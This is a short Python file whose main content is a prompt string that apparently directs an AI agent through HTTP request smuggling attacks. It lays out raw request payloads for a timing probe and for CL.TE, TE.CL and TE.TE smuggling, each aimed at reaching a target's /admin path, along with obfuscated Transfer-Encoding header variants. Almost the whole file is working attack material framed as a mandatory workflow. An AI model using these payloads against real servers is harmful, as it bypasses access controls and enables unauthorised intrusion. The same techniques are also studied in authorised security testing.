"""
HTTP Request Smuggling Attack Skill Prompt.
"""

HTTP_SMUGGLING_SKILL_PROMPT = """
## ATTACK SKILL: HTTP REQUEST SMUGGLING

### MANDATORY WORKFLOW

#### STEP 1: DETECTION — TIMING TECHNIQUE
```http
POST / HTTP/1.1
Host: TARGET
Transfer-Encoding: chunked
Content-Length: 6

0

G
```
-> If response is delayed (~5 seconds), front-end used CL, back-end used TE -> CL.TE smuggling.

#### STEP 2: CL.TE SMUGGLING
```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 35
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: TARGET
```
-> Front-end uses Content-Length (35 bytes), back-end uses Transfer-Encoding (0 terminates).

#### STEP 3: TE.CL SMUGGLING
```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: TARGET
Content-Length: 15

x=1
0

```

#### STEP 4: TE.TE SMUGGLING
Obfuscate one Transfer-Encoding header to confuse one proxy:
```
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
```

#### ANTI-PATTERNS: Test ALL three variants (CL.TE, TE.CL, TE.TE). Use HTTP Request Smuggler Burp extension or `smuggler.py`.
"""
